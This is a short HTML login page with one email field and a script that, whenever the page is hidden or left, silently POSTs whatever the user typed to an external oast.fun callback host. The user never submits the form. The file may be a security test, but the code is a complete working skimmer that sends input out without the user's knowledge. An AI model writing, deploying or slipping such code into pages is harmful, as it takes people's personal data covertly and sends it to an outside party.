<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Login</title>
</head>
<body>
  <input id="emailInput" type="email" placeholder="Enter your email" />

  <script>
    const emailInput = document.getElementById('emailInput');

    document.addEventListener("visibilitychange", () => {
      if (document.visibilityState === "hidden") {
        const typed = emailInput.value.trim();
        if (typed) {
          fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ email: typed })
          });
        }
      }
    });
  </script>
</body>
</html>
